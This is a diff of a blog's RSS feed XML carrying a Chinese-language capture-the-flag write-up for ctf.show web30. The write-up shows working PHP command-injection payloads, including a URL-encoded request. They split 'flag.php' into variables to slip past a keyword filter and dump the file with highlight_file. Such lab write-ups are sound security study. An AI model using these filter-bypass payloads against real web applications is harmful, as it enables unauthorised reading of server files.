@@ -1,5 +1,5 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Ayx的Gmeek博客</title><link>https://Ayx03.github.io/Gmeek</link><description>Aynxul03的又一个博客</description><copyright>Ayx的Gmeek博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://Ayx03.github.io/Gmeek</link></image><lastBuildDate>Tue, 15 Sep 2026 02:35:25 +0000</lastBuildDate><managingEditor>Ayx的Gmeek博客</managingEditor><ttl>60</ttl><webMaster>Ayx的Gmeek博客</webMaster><item><title>WriteUp_web30_Web入门_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_web30_Web-ru-men-_ctf.show.html</link><description>题目描述依然是`命令执行，需要严格的过滤`，代码中只是额外过滤了 `system` 和 `php`
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Ayx的Gmeek博客</title><link>https://Ayx03.github.io/Gmeek</link><description>Aynxul03的又一个博客</description><copyright>Ayx的Gmeek博客</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://Ayx03.github.io/Gmeek</link></image><lastBuildDate>Tue, 15 Sep 2026 02:35:59 +0000</lastBuildDate><managingEditor>Ayx的Gmeek博客</managingEditor><ttl>60</ttl><webMaster>Ayx的Gmeek博客</webMaster><item><title>WriteUp_web30_Web入门_ctf.show</title><link>https://Ayx03.github.io/Gmeek/post/WriteUp_web30_Web-ru-men-_ctf.show.html</link><description>题目描述依然是`命令执行，需要严格的过滤`，代码中只是额外过滤了 `system` 和 `php`
 ```php
 &lt;?php
 
@@ -27,11 +27,11 @@ if(isset($_GET['c'])){
 ```
 但是我上一题本来就没用 `system` 啊，我把 php 拆开写你不又炸了吗？上一题的 Payload：
 
-```
+```php
 $a='fla'; $b='g.php'; highlight_file($a.$b);
 ```
 改造一下加上第三个变量：
-```
+```php
 $a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
 ```
 
@@ -40,7 +40,7 @@ $a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
 /?c=$a=%27fla%27;%20$b=%27g.ph%27;%20$c=%27p%27%20;highlight_file($a.$b.$c);
 ```
 或者我们可以把空格去掉：
-```
+```php
 $a='fla';$b='g.ph';$c='p';highlight_file($a.$b.$c);
 ```
 浏览器自动 URL 编码后的 Payload 会更简单明了一点：
